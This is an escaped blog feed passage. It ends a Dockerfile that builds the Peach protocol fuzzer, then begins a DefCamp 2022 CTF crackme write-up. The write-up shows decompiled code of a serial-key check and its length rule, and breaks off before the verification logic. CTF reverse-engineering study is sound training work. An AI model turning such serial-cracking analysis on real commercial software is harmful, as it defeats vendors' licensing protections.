&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#RUN sed -i s/pin-3.19-98425-gcc-linux/pin-3.2-98437-gcc-linux/g build/config/linux.py&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#RUN cd 3rdParty/pin/ &amp;amp;&amp;amp; tar xzf pin-3.20-98437-gf02b61307-gcc-linux.tar.gz &amp;amp;&amp;amp; \&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#    mv pin-3.20-98437-gf02b61307-gcc-linux pin-3.2-98437-gcc-linux&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#RUN sed -i s/pin-3.2-81205-gcc-linux/pin-3.20-98437-gf02b61307-gcc-linux/g build/config/linux.py&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Install specific mono for compiling&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# RUN apt install dirmngr gnupg apt-transport-https ca-certificates -y&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;deb https://download.mono-project.com/repo/ubuntu stable-bionic main&amp;#34;&lt;/span&gt; &amp;gt; /etc/apt/sources.list.d/mono-official-stable.list&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; apt-get update -y&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; apt-get install -y mono-devel&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; mozroots --import --sync&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; mono --version&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Patch bblocks.cpp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce/-/issues/1&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce/-/merge_requests/7&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/^int main.*/itemplate&amp;lt;bool b&amp;gt;\nstruct StaticAssert {};\ntemplate &amp;lt;&amp;gt;\nstruct StaticAssert&amp;lt;true&amp;gt;\n{\n       static void myassert() {}\n};\n&amp;#39;&lt;/span&gt; core/BasicBlocks/bblocks.cpp&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/STATIC_ASSERT(sizeof(size_t) == sizeof(ADDRINT))/StaticAssert&amp;lt;sizeof(size_t) == sizeof(ADDRINT)&amp;gt;::myassert()/g&amp;#39;&lt;/span&gt; core/BasicBlocks/bblocks.cpp&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Patch BaseProgram.cs  error CS0219: Warning as Error: The variable `config&amp;#39; is assigned but its value is never used&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce/-/issues/3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/var config = new LicenseConfig();/\/\/var config = new LicenseConfig();/g&amp;#39;&lt;/span&gt; pro/Core/Runtime/BaseProgram.cs&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Configure and build&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; ./waf configure&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; ./waf build&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Downgrade mono back to 4.x for installation and runtime&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# The installed mono version 6.12.0.122 (tarball Mon Feb 22 17:33:15 UTC 2021) is not supported.&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Ensure mono version 4.x and not 4.4 is installed and try again.&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; apt purge -y mono* libmono* doxygen &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    rm /etc/apt/sources.list.d/mono-official-stable.list&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; apt update -y&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; apt install -y mono-complete&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; ./waf install&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; cp -r output/linux_x86_64_release/bin /peach&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; cp -r output/doc/sdk /peach/doc&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>DefCamp2022 can-you-crack-this Writeup</title>
        <link>/post/defcamp2022-can-you-crack-this-wp/</link>
        <pubDate>Mon, 14 Feb 2022 23:08:32 +0800</pubDate>
        
        <guid>/post/defcamp2022-can-you-crack-this-wp/</guid>
        <description>&lt;img src="/post/defcamp2022-can-you-crack-this-wp/cover.jpg" alt="Featured image of post DefCamp2022 can-you-crack-this Writeup" /&gt;&lt;h2 id=&#34;can-you-crack-this&#34;&gt;can-you-crack-this&lt;/h2&gt;
&lt;p&gt;The main function reads the input and constrains the length.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;  v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter your public key: &amp;#34;&lt;/span&gt;);
  std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;ostream&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;(v11, std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;,std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;);
  std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cin, public_key);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;length(public_key) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; ) {
    v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter serial key:&amp;#34;&lt;/span&gt;);
    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;ostream&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;(v9, std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;,std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;);
    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cin, serial_key);
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;length(public_key) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v8 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;length(serial_key) ) {
      std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;basic_string(str_public_key, public_key);
      std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;basic_string(str_serial_key, serial_key);
      v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; verify_serial((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)str_public_key, (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)str_serial_key);
      std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::~&lt;/span&gt;string(str_serial_key);
      std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;string&lt;span style=&#34;color:#f92672&#34;&gt;::~&lt;/span&gt;string(str_public_key);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v6 ) {
        v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Serial accepted.&amp;#34;&lt;/span&gt;);
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;ostream&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;(v5, std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;,std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;);
      }
      &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Try harder.&amp;#34;&lt;/span&gt;);
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;ostream&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;(v4, std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;,std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;);
      }
      v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
      v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid serial length.&amp;#34;&lt;/span&gt;);
      std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;ostream&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;(v7, std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;,std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;);
      v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
    v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid length.&amp;#34;&lt;/span&gt;);
    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;ostream&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;(v10, std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;,std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;char_traits&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;);
    v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It requires that the two input strings satisfy the constraint &lt;code&gt;len(serial) = len(publik_key) * 4 - 1&lt;/code&gt; and passes the two strings into the &lt;code&gt;verify_serial()&lt;/code&gt; function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;_BOOL8 &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;verify_serial&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a2) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// rsi
